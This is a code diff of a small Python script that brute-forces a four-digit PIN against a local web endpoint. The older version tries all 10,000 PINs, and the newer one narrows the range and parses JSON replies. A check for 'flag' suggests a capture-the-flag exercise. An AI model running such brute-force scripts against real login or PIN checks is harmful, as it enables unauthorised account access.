@@ -1,22 +1,28 @@
 import requests
-import json
+import time
 
-url = "http://localhost:5000/check-pin"
+URL = "http://localhost:5000/check-pin"  # Update this if needed
 
-for pin in range(10000):  # 0000 to 9999
-    pin_str = f"{pin:04d}"  # pad with zeroes to make it 4-digit
-    data = {"pin": pin_str}
-    
-    # response = requests.post(url, data=data)
-    headers = {"Content-Type": "application/json"}
-    response = requests.post(url, data=json.dumps(data), headers=headers)
+for pin in range(3330, 3340):
+    pin_str = f"{pin:04d}"  # Format as 4-digit string (e.g., "0001")
 
-    # Optional: print progress
-    print(f"Trying PIN: {pin_str} => {response.status_code}")
+    try:
+        response = requests.post(
+            URL,
+            json={"pin": pin_str},
+            headers={"Content-Type": "application/json"}
+        )
 
-    # Check if PIN is correct
-    if "success" in response.text.lower() or "flag" in response.text.lower():
-        print(f"\n🎉 PIN FOUND: {pin_str}")
-        print("Response:")
-        print(response.text)
-        break
+        data = response.json()
+        print(data)
+
+        if data.get("status") == "success":
+            print(f"[✅] PIN found: {pin_str}")
+            print(f"Response: {data}")
+            break
+        else:
+            print(f"[❌] Tried: {pin_str} => {data.get('message')}")
+
+    except Exception as e:
+        print(f"[⚠️] Error on PIN {pin_str}: {e}")
+        # time.sleep(1)  # Sleep to avoid hammering server on failure
